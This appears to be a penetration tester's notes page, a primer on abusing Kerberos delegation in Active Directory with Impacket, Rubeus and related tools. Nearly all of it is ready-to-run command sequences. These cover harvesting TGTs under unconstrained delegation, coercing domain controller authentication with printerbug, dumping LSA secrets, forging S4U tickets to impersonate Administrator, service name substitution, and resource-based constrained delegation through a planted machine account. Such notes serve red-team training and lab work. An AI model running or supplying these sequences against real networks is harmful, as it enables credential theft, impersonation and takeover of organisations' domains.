The following section details methods to enumerate and abuse Kerberos and its associated delegation features. This section is NOT concerned with OPSEC or theory, but serves as a primer to abusing Kerberos via Linux and the Impacket Suite (mostly).

For a detailed understanding of delegation, see [[12 Kerberos]]

Enumeration
```bash
# Enumerating -- Make note of FULL spn, including PORT
impacket-findDelegation [DOMAIN]/[user]:[password] -target-domain [DOMAIN]
	# This checks for the following:
	Unconstrained Delegation
	Constrained Delegation (S4U2proxy)
	Protocol Transition (S4U2self)
	Resource-Based Constrained Delegation

# Moving to vulnerable host (EXAMPLE)
impacket-wmiexec [DOMAIN]/[user]:[password]@[hostname.domain]
```

Converting Tickets (also see [[Kerberos Tickets]])
```bash
echo "[BASE64_STRING_FROM_RUBEUS]" | base64 -d > captured_tgt.kirbi 
impacket-ticketConverter captured_tgt.kirbi captured_tgt.ccache  # convert
export KRB5CCNAME=/path/to/captured_tgt.ccache    # dont forget krb5.conf
```
#### Lateral Movement Services Cheat Sheet

| **Name** | **Description**                                                      | **Ticket(s)**                          |
| -------- | -------------------------------------------------------------------- | -------------------------------------- |
| SMB      | Access the remote filesystem.  View, list, upload, & delete files.   | CIFS                                   |
| PsExec   | Run a binary via the Service Control Manager.                        | CIFS                                   |
| WinRM    | Windows Remote Management.                                           | HTTP                                   |
| WMI      | Execute applications on the remote target, e.g. process call create. | RPCSS  <br>HOST  <br>RestrictedKrbHost |
| RDP      | Remote Desktop Protocol.                                             | TERMSRV  <br>HOST                      |
| MSSQL    | MS SQL Databases.                                                    | MSSQLSvc                               |

# Unconstrained Delegation
Unconstrained is the first type of delegation and the most dangerous. Compromise of a computer with unconstrained delegation means we can extract TGTs from memory.

Unconstrained Delegation
```bash
# Enumerate and move laterally to vulnerable machine

# Using Rubeus to monitor for TGTs and wait for high-priv user
.\Rubeus.exe monitor /nowrap  

# Convert and use ticket
echo "[BASE64_STRING]" | base64 -d > victim.kirbi
impacket-ticketConverter victim.kirbi victim.ccache
export KRB5CCNAME=/path/to/victim.ccache

# Abuse as necessary using Impacket tools
impacket-smbclient -k -no-pass [dc-hostname].domain

# Drop impersonation and cleanup
unset KRB5CCNAME
rm captured_tgt.kirbi captured_tgt.ccache
```

S4U2self (Protocol Transition) Computer Takeover (Forcing auth for unconstrained delegation)
```bash
# Enumerate and move laterally to vulnerable machine

# Using Rubeus to monitor for TGTs
.\Rubeus.exe monitor /nowrap  

# Force DC to authenticate to monitored system using SpoolSample or PetitPotam
# First way: From our linux box
1. python3 printerbug.py [DOMAIN]/[user]:[password]@[DC_HOSTNAME] [monitored host]
# Second way: From the windows box
1. .\SharpSpoolTrigger.exe [DC hostname] [monitored host]

# Dump the TGT of the DC from the compromised machine's memory
netexec smb lon-ws-1.contoso.com -u [user] -p [password] --lsa
	# Save the extracted lon-dc-1$ TGT to a .ccache file locally

# Use S4U2self protocol to obtain usable service ticket for different impersonated user
# We use the extracted DC TGT (-k) and request an S4U2self ticket (-self) while substituting the SPN (-altservice)
export KRB5CCNAME=lon-dc-1_tgt.ccache
impacket-getST -spn cifs/lon-dc-1.contoso.com -impersonate Administrator -self -altservice cifs -dc-ip [DC_IP] -k '[DOMAIN]/lon-dc-1$'

# Inject captured service ticket into session
export KRB5CCNAME=Administrator.ccache

# Abuse as necessary.
impacket-smbclient -k -no-pass lon-dc-1.contoso.com
```

# Constrained Delegation
Constrained delegation is set on a front-end service and defines the back-end service(s) to which it can delegate to. We can still obtain the TGT for the computer account. Getting ST varies.

First, move laterally to the vulnerable computer

S4U w/ Protocol Transition Enabled
```bash
# Obtain the NTLM hash or AES key for the compromised computer account (e.g., lon-ws-1$) via secretsdump/lsa dump (nxc --lsa)/rubeus

# Use Impacket's getST to perform S4U (S4U2self -> S4U2proxy) and impersonate any user in the domain
impacket-getST -spn cifs/lon-fs-1.contoso.com -impersonate Administrator -dc-ip [DC_IP] '[DOMAIN]/lon-ws-1$' -hashes :[NTLM_HASH_OF_WS]
	# -spn = the service that the principal is allowed to delegate to.
	# -impersonate = the user we want to impersonate.
	# -hashes = the compromised computer account's hash.

# The tool automatically generates a .ccache file (e.g., Administrator.ccache) locally.
# Inject captured service ticket into your Linux session
export KRB5CCNAME=Administrator.ccache

# Abuse as necessary (Access the target service)
impacket-smbclient -k -no-pass lon-fs-1.contoso.com

# Drop impersonation and cleanup
unset KRB5CCNAME
rm Administrator.ccache
```

S4U w/ Protocol Transition Disabled
```bash
## NOTE : Requires a service ticket that a user has requested to gain access to the front-end service. 

# Assuming you extracted a user's service ticket (TGS) to the compromised machine from memory (e.g., using netexec/Mimikatz)
# Convert it to ccache if necessary
impacket-ticketConverter captured_user_tgs.kirbi captured_user_tgs.ccache

# Using S4U to impersonate a user we ALREADY have a service ticket for
# We pass the captured TGS using the -additional-ticket flag to skip the S4U2self step and feed it directly into S4U2proxy
impacket-getST -spn cifs/lon-fs-1.contoso.com -impersonate [victim_user] -additional-ticket captured_user_tgs.ccache -dc-ip [DC_IP] '[DOMAIN]/lon-ws-1$' -hashes :[NTLM_HASH_OF_WS]
	# -additional-ticket = a captured front-end service ticket for a user.

# The tool will output a new .ccache file for the delegated service.
# Inject the newly generated proxy service ticket into your Linux session
export KRB5CCNAME=[victim_user].ccache

# Abuse as necessary
impacket-smbclient -k -no-pass lon-fs-1.contoso.com

# Drop impersonation and cleanup
unset KRB5CCNAME
rm [victim_user].ccache captured_user_tgs.ccache
```
#### Service Name Substitution
Service Name Substitution is a technique that allows us to "swap" a service ticket for one service, to another service. Useful if we need a more useful service, like CIFS or something. See cheat sheet.

Service Name Substitution w/ Protocol Transition enabled
```bash
## First identify computers vulnerable to constrained delegation, if protocol transition is enabled, and their services
impacket-findDelegation [DOMAIN]/[user]:[password] -target-domain [DOMAIN]

# Assume we compromised the computer account hash (e.g., lon-ws-1$) and it is allowed to delegate to time/lon-dc-1

# S4U to impersonate any user AND change service using Impacket
impacket-getST -spn time/lon-dc-1.contoso.com -altservice cifs -impersonate Administrator -dc-ip [DC_IP] '[DOMAIN]/lon-ws-1$' -hashes :[NTLM_HASH_OF_WS]
	# -spn is the service that the principal is allowed to delegate to.
	# -altservice is the service to substitute into the final ticket.
	# -impersonate is the user we want to impersonate.
	# -hashes is the hash of the principal (computer account) configured for the delegation.

# The tool automatically generates a .ccache file locally.
# Inject service ticket into your Linux session
export KRB5CCNAME=Administrator.ccache

# Abuse as necessary (Access the newly substituted CIFS service)
impacket-smbclient -k -no-pass lon-dc-1.contoso.com

# Drop impersonation and cleanup
unset KRB5CCNAME
rm Administrator.ccache
```

Service Name Substitution w/ Protocol Transition disabled
```bash
## NOTE : Requires a service ticket that a user has requested to gain access to the front-end service. 

# Assuming you extracted a user's service ticket to the compromised machine from memory
# Convert it to ccache if necessary
impacket-ticketConverter captured_user_tgs.kirbi captured_user_tgs.ccache

# Use S4U to impersonate the user we ALREADY have a service ticket for AND change the service
# We pass the captured TGS using the -additional-ticket flag and the substitution using -altservice
impacket-getST -spn time/lon-dc-1.contoso.com -altservice cifs -impersonate [victim_user] -additional-ticket captured_user_tgs.ccache -dc-ip [DC_IP] '[DOMAIN]/lon-ws-1$' -hashes :[NTLM_HASH_OF_WS]
	# -spn is the service that the principal is allowed to delegate to.
	# -altservice is the service to substitute into the final ticket.
	# -impersonate is the user we want to impersonate.
	# -additional-ticket is the captured front-end service ticket for the user.
	# -hashes is the hash of the principal (computer account) configured for the delegation.

# The tool will output a new .ccache file locally for the substituted service.
# Inject the newly generated service ticket into your Linux session
export KRB5CCNAME=[victim_user].ccache

# Abuse as necessary (Access the newly substituted CIFS service)
impacket-smbclient -k -no-pass lon-dc-1.contoso.com

# Drop impersonation and cleanup
unset KRB5CCNAME
rm [victim_user].ccache captured_user_tgs.ccache
```
# Resource-Based Constrained Delegation

RBCD
```bash
# 1. Gain control of a principal with an SPN by adding our own fake computer to the domain
impacket-addcomputer '[DOMAIN]/[user]:[password]' -computer-name 'ATTACKER$' -computer-pass 'FakePass123!' -dc-ip [DC_IP]

# 2. Modify the target computer's attribute using our write privileges
impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'lon-fs-1$' -action 'write' '[DOMAIN]/[user]:[password]' -dc-ip [DC_IP]

# 3. Perform S4U steps to impersonate anyone in domain (using our newly created machine account credentials)
impacket-getST -spn cifs/lon-fs-1.contoso.com -impersonate Administrator -dc-ip [DC_IP] '[DOMAIN]/ATTACKER$:FakePass123!'

# 4. Inject captured service ticket into session 
export KRB5CCNAME=Administrator.ccache

# 5. Abuse
impacket-smbclient -k -no-pass lon-fs-1.contoso.com

# 6. Cleanup - remove our entry
impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'lon-fs-1$' -action 'flush' '[DOMAIN]/[user]:[password]' -dc-ip [DC_IP]
```